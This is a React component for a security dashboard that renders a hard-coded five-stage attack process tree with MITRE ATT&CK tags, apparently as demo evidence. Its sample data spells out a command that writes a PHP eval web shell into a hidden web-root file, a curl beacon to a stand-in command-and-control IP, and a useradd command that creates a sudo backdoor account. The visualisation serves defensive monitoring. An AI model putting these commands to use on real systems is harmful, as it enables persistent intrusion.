import React, { useState } from 'react'
import { Terminal, ShieldAlert, Cpu, Copy, Check, Hash, CornerDownRight, ExternalLink } from 'lucide-react'
import { EvidenceEvent } from '../types'

interface ProcessTreeProps {
  evidence: EvidenceEvent[]
  hostName: string
}

export const ProcessTree: React.FC<ProcessTreeProps> = ({ evidence, hostName }) => {
  const [copiedId, setCopiedId] = useState<string | null>(null)

  const steps = [
    {
      id: 'PT-01',
      title: 'Initial Web Ingress (Exploited Daemon)',
      process: 'edgegate_httpd',
      pid: 1420,
      ppid: 1,
      user: 'www-data',
      cmd: '/usr/sbin/edgegate_httpd -D FOREGROUND',
      hash: '9f83a218d6e1... (SHA-256)',
      phase: 'Initial Access',
      tag: 'T1190 Exploit Public-Facing App',
      severity: 'high',
      color: 'border-rose-200 dark:border-[#3D1F23] bg-rose-50/70 dark:bg-[#1A1314] text-rose-800 dark:text-[#F87171]'
    },
    {
      id: 'PT-02',
      title: 'Sub-Process Command Execution',
      process: '/bin/sh',
      pid: 1842,
      ppid: 1420,
      user: 'www-data',
      cmd: "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
      hash: 'e3b0c44298fc... (SHA-256)',
      phase: 'Execution',
      tag: 'T1059 Command and Scripting Interpreter',
      severity: 'critical',
      color: 'border-rose-300 dark:border-[#3D1F23] bg-rose-50 dark:bg-[#1A1314] text-rose-900 dark:text-[#F87171]'
    },
    {
      id: 'PT-03',
      title: 'Web Shell Persistence Implant Dropped',
      process: 'File System Write',
      pid: 0,
      ppid: 1842,
      user: 'www-data',
      cmd: '/var/www/html/assets/.sys_cache.php (MD5: e10adc3949ba59abbe56e057f20f883e)',
      hash: 'e10adc3949ba59abbe56e057f20f883e',
      phase: 'Persistence',
      tag: 'T1505.003 Web Shell',
      severity: 'critical',
      color: 'border-rose-400 dark:border-[#5C2329] bg-rose-100/80 dark:bg-[#201416] text-rose-950 dark:text-[#FCA5A5] font-bold shadow-sm'
    },
    {
      id: 'PT-04',
      title: 'Outbound Command & Control Beaconing',
      process: 'curl',
      pid: 2104,
      ppid: 1,
      user: 'root',
      cmd: 'curl -s -k https://198.51.100.42:8443/checkin --header "X-Implant: v1"',
      hash: '7b2a61c3902d... (SHA-256)',
      phase: 'Command & Control',
      tag: 'T1071.001 Web Protocols C2',
      severity: 'high',
      color: 'border-amber-200 dark:border-[#3B2D18] bg-amber-50 dark:bg-[#1A1713] text-amber-900 dark:text-[#FBBF24]'
    },
    {
      id: 'PT-05',
      title: 'Dormant Administrative Backdoor Account',
      process: 'useradd',
      pid: 2210,
      ppid: 1842,
      user: 'root',
      cmd: '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit',
      hash: 'a3819bcf8291... (SHA-256)',
      phase: 'Persistence / Privilege Escalation',
      tag: 'T1136.001 Local Account Creation',
      severity: 'critical',
      color: 'border-rose-300 dark:border-[#3D1F23] bg-rose-50 dark:bg-[#1A1314] text-rose-900 dark:text-[#F87171]'
    }
  ]

  const hasCompromise = evidence.some((e) => e.signal_class !== 'anomaly')

  const copyToClipboard = (cmd: string, id: string) => {
    navigator.clipboard.writeText(cmd)
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 2000)
  }

  if (!hasCompromise) {
    return (
      <div className="p-12 text-center rounded-2xl border border-[#E1E9F2] dark:border-[#222225] bg-white dark:bg-[#121214] text-[#111B36] dark:text-[#FFFFFF]">
        <Cpu className="w-12 h-12 text-emerald-600 dark:text-[#34D399] mx-auto mb-3 opacity-90" />
        <h3 className="text-base font-bold text-[#111B36] dark:text-white font-mono">Normal Process Lineage</h3>
        <p className="text-xs text-[#64748B] dark:text-[#8E8E93] mt-1 max-w-md mx-auto font-sans leading-relaxed">
          Zero anomalous process executions, command injection child shells, or unauthorized file implants detected for host {hostName}.
        </p>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      {/* Command Bar Banner */}
      <div className="p-3.5 bg-rose-50 dark:bg-[#1A1314] border border-rose-200 dark:border-[#3D1F23] rounded-xl text-xs text-rose-900 dark:text-[#F87171] flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <ShieldAlert className="w-4 h-4 text-rose-600 dark:text-[#F87171] shrink-0" />
          <span>
            <strong>Correlated Process Hierarchy:</strong> Exploitation spawned directly from unauthenticated HTTP daemon, progressing through web shell persistence to root account installation.
          </span>
        </div>
        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white dark:bg-[#18181B] border border-rose-200 dark:border-[#3D1F23] text-rose-700 dark:text-[#F87171] font-bold shrink-0">
          5-Stage Attack Chain
        </span>
      </div>

      {/* Hierarchical Process Tree Nodes */}
      <div className="space-y-3 relative pl-6 border-l-2 border-rose-400 dark:border-[#5C2329] ml-4 font-mono text-xs">
        {steps.map((step, idx) => (
          <div key={step.id} className="relative group">
            {/* Horizontal Branch Connector Line */}
            <div className="absolute -left-[26px] top-5 w-4 h-0.5 bg-rose-400 dark:bg-[#5C2329]" />

            <div className={`p-4 rounded-xl border ${step.color} shadow-sm transition hover:border-[#7194B7] dark:hover:border-[#52525B]`}>
              <div className="flex items-center justify-between gap-2 mb-2 flex-wrap">
                <div className="flex items-center gap-2.5">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-[#E6EEF7] dark:bg-[#18181B] text-[#111B36] dark:text-white font-black border border-[#E1E9F2] dark:border-[#27272A]">
                    0{idx + 1}
                  </span>
                  <span className="font-bold text-[#111B36] dark:text-white text-xs">{step.title}</span>
                  <span className="text-[11px] text-[#64748B] dark:text-[#8E8E93]">
                    Process: <strong className="text-[#111B36] dark:text-white">{step.process}</strong>
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-white dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] text-[#64748B] dark:text-[#8E8E93]">
                    {step.tag}
                  </span>
                  <span className="text-[9px] px-1.5 py-0.2 rounded font-black uppercase tracking-wider bg-rose-100 dark:bg-[#3D1F23] text-rose-700 dark:text-[#F87171] border border-rose-200 dark:border-[#5C2329]">
                    {step.severity}
                  </span>
                </div>
              </div>

              {/* Context bar */}
              <div className="flex items-center gap-3 text-[10px] text-[#64748B] dark:text-[#8E8E93] mb-2">
                <span>User: <strong className="text-amber-700 dark:text-[#FBBF24] uppercase">{step.user}</strong></span>
                <span>•</span>
                <span>PID: <strong className="text-[#111B36] dark:text-white">{step.pid || 'N/A'}</strong></span>
                <span>•</span>
                <span>PPID: <strong className="text-[#111B36] dark:text-white">{step.ppid || 'N/A'}</strong></span>
                <span>•</span>
                <span>Checksum: <code className="text-[#64748B] dark:text-[#8E8E93]">{step.hash}</code></span>
              </div>

              {/* Command Box */}
              <div className="bg-white dark:bg-[#18181B] p-2.5 rounded-lg border border-[#E1E9F2] dark:border-[#27272A] text-[11px] text-[#111B36] dark:text-white flex items-center justify-between gap-2">
                <div className="flex items-center gap-2 overflow-x-auto select-all">
                  <Terminal className="w-3.5 h-3.5 text-[#7194B7] dark:text-[#8E8E93] shrink-0" />
                  <code className="text-[#111B36] dark:text-[#E4E4E7]">{step.cmd}</code>
                </div>
                <button
                  onClick={() => copyToClipboard(step.cmd, step.id)}
                  className="px-2 py-1 rounded bg-[#F7FAFD] dark:bg-[#222225] border border-[#E1E9F2] dark:border-[#27272A] hover:bg-[#E6EEF7] dark:hover:bg-[#2A2A2E] text-[#64748B] dark:text-white text-[10px] shrink-0 transition cursor-pointer"
                  title="Copy command line"
                >
                  {copiedId === step.id ? <Check className="w-3 h-3 text-emerald-600 dark:text-[#34D399]" /> : <Copy className="w-3 h-3" />}
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

export default ProcessTree
